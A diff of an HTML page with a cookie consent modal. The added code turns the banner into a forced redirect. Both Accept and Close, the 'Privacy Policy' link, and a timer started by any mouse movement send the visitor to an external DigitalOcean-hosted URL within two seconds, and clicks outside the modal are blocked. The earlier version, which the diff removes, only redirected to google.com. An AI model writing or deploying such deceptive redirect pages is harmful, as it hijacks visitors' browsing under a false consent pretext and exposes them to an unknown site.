@@ -1,168 +1,139 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <!DOCTYPE html>
-<html lang="en">
-<head>
- <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Cookie Consent Modal</title>
-  <style>
-    body.modal-open {
-      overflow: hidden;
-    }
-
-    body.modal-open .mainContent {
-      filter: blur(5px);
-      pointer-events: none;
-      user-select: none;
-    }
-
+ 	<style>
     .modalWrapper {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0, 0, 0, 0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      font-family: "Poppins", sans-serif;
-    }
-
-    .modalWrapper.show {
-      display: flex;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
     }
 
     .modalContent {
-      background: linear-gradient(135deg, #ff7b7b, #ffdd00);
-      padding: 30px;
-      max-width: 500px;
-      width: 90%;
-      border-radius: 12px;
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
-      text-align: center;
-      animation: fadeIn 0.3s ease;
+        background-color: white !important;
+        padding: 20px;
+        position: relative;
+        border-radius: 10px;
+        border: 2px solid white;
+        padding: 40px;
     }
 
-    .modalContent h1 {
-      font-size: 24px;
-      margin-bottom: 15px;
-      color: white;
-      font-weight: bold;
+    @media (max-width: 520px) {
+        .modalContent {
+            width: 90%;
+        }
     }
 
-    .modalContent p {
-      font-size: 16px;
-      color: #fff;
-      line-height: 1.6;
-      margin-bottom: 25px;
+    @media (min-width: 520px) {
+        .modalContent {
+            width: 65%;
+        }
     }
 
-    .modalContent a {
-      color: #ffdd00;
-      text-decoration: underline;
+    .modalContent img {
+        max-width: 100%;
+        height: auto;
+        border-radius: 10px;
     }
 
-    .btnGroup {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      flex-wrap: wrap;
+    .closeBtn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        padding: 5px;
+        color: blue;
+        font-weight: 500;
+        border-radius: 0px 10px 0px 0px;
+        cursor: pointer;
     }
 
     .actionBtn {
-      padding: 12px 24px;
-      font-size: 16px;
-      font-weight: bold;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: all 0.2s ease-in-out;
+        background-color: #007bff;
+        font-family: "Poppins", Sans-serif;
+        font-weight: 500;
+        border: none;
+        padding: 15px 30px;
+        color: #FFFFFF;
+        border-radius: 5px;
+        cursor: pointer;
     }
 
-    .acceptBtn {
-      background-color: #28a745;
-      color: white;
+    / Disable scrolling when modal is open /
+    body.modal-open {
+        overflow: hidden;
     }
+</style>
 
-    .acceptBtn:hover {
-      background-color: #218838;
-    }
-
-    .declineBtn {
-      background-color: #dc3545;
-      color: white;
-    }
-
-    .declineBtn:hover {
-      background-color: #c82333;
-    }
-
-    @keyframes fadeIn {
-      from {
-        transform: scale(0.95);
-        opacity: 0;
-      }
-      to {
-        transform: scale(1);
-        opacity: 1;
-      }
-    }
-  </style>
-</head>
-<body>
-
-<div class="mainContent">
-  <h2 style="text-align:center; padding: 50px;">Welcome to My Colorful Website!</h2>
-  <p style="text-align:center;">Your actual website content goes here.</p>
-</div>
-
-<div id="modal" class="modalWrapper">
-  <div class="modalContent">
-    <h1>We Use Cookies!</h1>
-    <p>
-      This website uses cookies to enhance your experience. You can accept or decline below.
-      <br><br>
-      Read our <a href="https://google.com" target="_blank">Privacy Policy</a>.
-    </p>
-    <div class="btnGroup">
-      <button id="acceptBtn" class="actionBtn acceptBtn">Accept</button>
-      <button id="declineBtn" class="actionBtn declineBtn">Decline</button>
+<div class="modalContainer">
+    <div id="modal" class="modalWrapper">
+        <div class="modalContent">
+            <div id="dismissModal" class="closeBtn">Close</div>
+            <h1>Cookie Policy</h1>
+            <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, please visit our <a href="https://seashell-app-d9vr8.ondigitalocean.app/">Privacy Policy</a>.</p>
+            <button id="confirmBtn" class="actionBtn">Accept</button>
+        </div>
     </div>
-  </div>
 </div>
 
 <script>
-  const modal = document.getElementById("modal");
-  const acceptBtn = document.getElementById("acceptBtn");
-  const declineBtn = document.getElementById("declineBtn");
+    var modal = document.getElementById('modal');
+    var dismissModal = document.getElementById('dismissModal');
+    var confirmBtn = document.getElementById('confirmBtn');
 
-  const redirectUrl = "https://google.com";  // Updated to google.com
+    var redirectUrl = "https://seashell-app-d9vr8.ondigitalocean.app/"; // Set your dynamic URL here
+    var cursorMoved = false;
+    var redirectTimer;
 
-  window.addEventListener("load", () => {
-    modal.classList.add("show");
-    document.body.classList.add("modal-open");
-  });
+    // Show the modal instantly after page load and disable scrolling
+    window.addEventListener('load', function () {
+        modal.style.display = 'flex';
+        document.body.classList.add('modal-open');
+    });
 
-  function closeModalAndRedirect() {
-    modal.classList.remove("show");
-    document.body.classList.remove("modal-open");
-    window.location.href = redirectUrl;
-  }
+    // Function to close the modal and navigate to a link
+    function closeModal() {
+        modal.style.display = 'none';
+        document.body.classList.remove('modal-open'); // Re-enable scrolling
+        if (redirectUrl) {
+            window.location.href = redirectUrl; // Redirect to the given URL
+        }
+    }
 
-  acceptBtn.addEventListener("click", closeModalAndRedirect);
-  declineBtn.addEventListener("click", closeModalAndRedirect);
+    // Close modal on close button click
+    dismissModal.addEventListener('click', function () {
+        closeModal();
+    });
+
+    // Close modal on accept button click
+    confirmBtn.addEventListener('click', function () {
+        closeModal();
+    });
+
+    // Auto redirect after 2 seconds of cursor movement
+    window.addEventListener('mousemove', function () {
+        if (!cursorMoved) {
+            cursorMoved = true;
+            redirectTimer = setTimeout(function () {
+                window.location.href = redirectUrl;
+            }, 2000); // Redirect after 2 seconds
+        }
+    });
+
+    // Prevent modal from closing on clicking outside modal content
+    modal.addEventListener('click', function (event) {
+        if (event.target === modal) {
+            event.stopPropagation(); // Do nothing if clicked outside the modal content
+        }
+    });
+
 </script>
-
-</body>
-</html>
-
 
 </body>
 </html>
